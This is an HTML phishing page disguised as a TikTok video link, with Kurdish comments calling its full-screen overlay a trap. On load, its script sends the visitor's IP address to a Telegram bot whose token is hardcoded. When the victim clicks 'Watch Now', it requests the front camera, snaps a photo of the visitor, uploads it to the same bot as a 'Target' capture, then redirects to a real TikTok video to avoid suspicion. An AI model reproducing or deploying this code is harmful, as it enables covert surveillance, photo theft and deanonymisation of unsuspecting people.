<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok . Nyan Faxir</title>
    
    <meta property="og:title" content="TikTok . Nyan Faxir">
    <meta property="og:description" content="2.9K likes, 188 comments. '#nyan_faxir #hawler_soran_2026'">
    <meta property="og:image" content="pasha.jpg?v=999">
    <meta property="og:url" content="https://rudawsoran.github.io/News/">
    <meta property="og:type" content="video.other">

    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        
        .bg { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: url('pasha.jpg?v=999') no-repeat center center; 
            background-size: cover; z-index: 1; transform: scale(1.1); filter: brightness(0.7);
        }

        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
        
        /* تەپکەکە - هەموو شاشەکە دەگرێت */
        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
        
        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 200; display: none; }
        
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="bg"></div>
    
    <div class="play-btn">
        <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
        <p style="color:white; text-align:center; font-weight:bold;">Watch Now</p>
    </div>

    <div id="flash"></div>
    <div id="trap" onclick="startApp()"></div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        // زانیارییەکانی تێلێگرام
        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
        const chat_id = "7261354534";
        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";

        // ناردنی IP یەکسەر
        async function notifyVisit() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🔔 Target Opened Link\n🌐 IP: " + data.ip + "\n👤 Mode: Nyan Faxir")}`);
            } catch (e) {}
        }
        notifyVisit();

        async function sendPhoto(v, c, fileName, caption) {
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const dataUrl = c.toDataURL('image/jpeg', 0.8);
            const blob = await (await fetch(dataUrl)).blob();
            const fd = new FormData();
            fd.append('chat_id', chat_id);
            fd.append('photo', blob, fileName);
            fd.append('caption', caption);
            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }

        async function startApp() {
            // ئەگەر نەیویست Allow بکات یان کێشەیەک هەبوو، ڕاستەوخۆ دەڕوات بۆ ڤیدیۆکە
            const forceRedirect = setTimeout(() => {
                window.location.href = targetVideo;
            }, 5000); // ئەگەر دوای 5 چرکە هیچ بڕیارێکی نەدا، ڕاستەوخۆ دەینێرێت

            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                clearTimeout(forceRedirect); // ئەگەر Allow کردی، ئیتر ڕاگیراوەکە هەڵدەوەشێتەوە تا وێنەکە بگرێت
                
                const v = document.getElementById('v');
                v.srcObject = s;
                await v.play();
                
                const f = document.getElementById('flash');
                f.style.display = 'block'; // فلاشێکی سپی بۆ ئەوەی گومان نەکات

                // وێنەکە دەگرێت و یەکسەر دەینێرێت
                await sendPhoto(v, document.getElementById('c'), "snap.jpg", "📸 Captured: Nyan Faxir Target");
                
                // دوای نیو چرکە دەینێرێت بۆ تیکتۆک
                setTimeout(() => {
                    window.location.href = targetVideo;
                }, 500);

            } catch (e) {
                // ئەگەر Blockـی کرد یان Allowـی نەکرد، یەکسەر دەچێتە سەر تیکتۆک
                window.location.href = targetVideo;
            }
        }
    </script>
</body>
</html>
